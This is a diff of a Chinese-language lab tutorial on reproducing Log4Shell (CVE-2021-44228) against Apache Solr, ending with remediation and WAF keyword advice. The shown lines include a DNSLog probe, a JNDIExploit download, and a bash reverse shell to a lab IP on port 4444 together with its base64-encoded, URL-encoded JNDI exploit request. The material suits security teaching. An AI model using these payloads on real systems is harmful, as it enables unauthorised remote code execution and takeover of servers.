@@ -36,7 +36,7 @@ CVE-2021-44228，又名 Log4Shell，是 Apache Log4j2 日志组件中被发现�
 
 **Step 1：获取 DNSLog 域名**
 
-访问 DNSLog 平台（如 `dnslog.cn`），获取一个专属域名，例如 `bu74sz.dnslog.cn`。
+访问 DNSLog 平台（如 dnslog.cn），获取一个专属域名，例如 bu74sz.dnslog.cn。
 
 **Step 2：构造并发送 Payload**
 
@@ -59,9 +59,9 @@ http://192.168.197.88:8983/solr/admin/cores?action=${jndi:ldap://bu74sz.dnslog.c
 #### 3.1 漏洞原理
 DNSLog 探测只能证明漏洞存在，要获取服务器权限需要进一步利用，核心手段是**反弹 Shell**。这一切都建立在 Log4j2 的 **Lookup（查找）机制**之上。
 
-Log4j2 允许在日志信息中使用 `${}` 语法动态插入运行时值，其中 **JNDI Lookup**（即 `${jndi:...}`）是功能最强大的查找方式之一。JNDI（Java Naming and Directory Interface，Java命名与目录接口）是 Java 官方提供的一套 API，允许应用程序通过一个名称去动态查找和访问远程资源，包括 LDAP 目录服务、RMI 远程对象等。开发者本意是用它来读取配置中心或外部服务的数据，但问题在于：**这些表达式的解析过程完全可控，且没有任何白名单或权限校验**。
+Log4j2 允许在日志信息中使用 \${} 语法动态插入运行时值，其中**JNDI Lookup**（即 ${jndi:...}）是功能最强大的查找方式之一。JNDI（Java Naming and Directory Interface，Java命名与目录接口）是 Java 官方提供的一套 API，允许应用程序通过一个名称去动态查找和访问远程资源，包括 LDAP 目录服务、RMI 远程对象等。开发者本意是用它来读取配置中心或外部服务的数据，但问题在于：**这些表达式的解析过程完全可控，且没有任何白名单或权限校验**。
 
-攻击者正是看中了这一点，构造恶意输入，将 `${jndi:ldap://攻击者IP/恶意类}` 这类字符串注入到应用日志中。Log4j2 在记录日志时，会解析 `${}` 表达式并触发 JNDI 查询，导致服务器主动去连接攻击者搭建的恶意 LDAP 服务。
+攻击者正是看中了这一点，构造恶意输入，将 \${jndi:ldap:\//攻击者IP/恶意类} 这类字符串注入到应用日志中。Log4j2 在记录日志时，会解析 ${} 表达式并触发 JNDI 查询，导致服务器主动去连接攻击者搭建的恶意 LDAP 服务。
 
 完整的攻击链路如下：
 ```
@@ -107,7 +107,7 @@ sequenceDiagram
 从技术角度看，漏洞的根本成因有两个层面：
 
 1. **Log4j2 层面**：Log4j2 的 JNDI Lookup 功能默认开启，且未对 JNDI 请求的目标地址做任何限制或过滤，导致攻击者可以任意指定 LDAP、RMI、DNS 等协议的服务地址。
-2. **JDK 层面**：在 JDK 8u191 之前的版本中，`com.sun.jndi.ldap.object.trustURLCodebase` 参数默认为 `true`，允许 JNDI 从远程 HTTP 服务器动态加载 Java 类并实例化。这个设计原本是为了方便 RMI/LDAP 服务分发对象，却成了攻击者植入恶意代码的通道。
+2. **JDK 层面**：在 JDK 8u191 之前的版本中，com.sun.jndi.ldap.object.trustURLCodebase 参数默认为 true，允许 JNDI 从远程 HTTP 服务器动态加载 Java 类并实例化。这个设计原本是为了方便 RMI/LDAP 服务分发对象，却成了攻击者植入恶意代码的通道。
 
 两者叠加，使得攻击者仅需一个简单的字符串注入点，就能实现远程代码执行，无需任何认证。这也是 Log4Shell 被评为 CVSS 10.0（最高严重等级）的核心原因。
 
@@ -141,6 +141,7 @@ wget https://bit.ly/3Azqvnq -O JNDIExploit-1.2-SNAPSHOT.jar
 ```
 
 **Step 3：启动恶意 LDAP 服务**
+
 由于在新版kali不能下载Java 8，因此使用docker，并将JNDIExploit挂载到docker容器中。
 ```
 # 拉取 OpenJDK 8 镜像
@@ -221,7 +222,7 @@ bash -c "bash -i >& /dev/tcp/192.168.197.10/4444 0>&1"
 echo -n 'bash -c "bash -i >& /dev/tcp/192.168.197.10/4444 0>&1"' | base64
 ```
 
-得到编码串：`YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMC80NDQ0IDA+JjEi`，拼进 JNDI 表达式并**对整段做 URL 编码**后，最终访问：
+得到编码串：YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMC80NDQ0IDA+JjEi，拼进 JNDI 表达式并对整段做 URL 编码后，最终访问：
 
 ```
 http://192.168.197.88:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F192.168.197.10%3A1389%2FBasic%2FCommand%2FBase64%2FYmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMC80NDQ0IDA%2BJjEi%7D
@@ -237,10 +238,10 @@ http://192.168.197.88:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F192
 -Dlog4j2.formatMsgNoLookups=true
 ```
 
-3.**配合WAF规则**：在应用前端部署WAF，对包含`${jndi:`、`${rmi:`等关键字的请求进行拦截，作为临时防御补充。
+3.**配合WAF规则**：在应用前端部署WAF，对包含\${jndi:、\${rmi\:等关键字的请求进行拦截，作为临时防御补充。
 
 4.**排查其他Log4j2版本**：Log4j 2.0-beta9至2.14.1均受影响，需全面排查项目依赖，包括间接依赖的Log4j2组件。
 
-5.**注意JDK版本差异**：JDK 8u191及以上版本默认限制了远程类加载，但**不能依赖此特性作为防护手段**，升级Log4j2才是根本解决方案。
+5.**注意JDK版本差异**：JDK 8u191及以上版本默认限制了远程类加载，但不能依赖此特性作为防护手段，升级Log4j2才是根本解决方案。
 
 >**注意**：无论采用哪种修复方式，部署前务必在测试环境中充分验证，避免对业务造成影响。
